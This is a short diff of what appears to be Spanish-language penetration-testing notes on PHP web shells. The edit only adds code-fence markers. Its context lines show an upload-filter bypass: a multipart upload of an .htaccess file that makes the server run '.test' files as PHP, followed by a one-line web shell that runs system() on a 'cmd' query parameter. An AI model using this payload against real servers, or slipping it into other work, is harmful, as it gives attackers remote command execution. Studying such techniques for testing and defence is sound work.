@@ -1,4 +1,5 @@
 -- -
+ ```php
 1. Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess" 
     Content-Type: text/plain
     AddType application/x-httpd-php .test 
@@ -9,6 +10,8 @@
 	<?php
 		system($_GET['cmd']);
 	?>
+	```
+
 **Otro tipo de webshells en php:**
 
 ```php
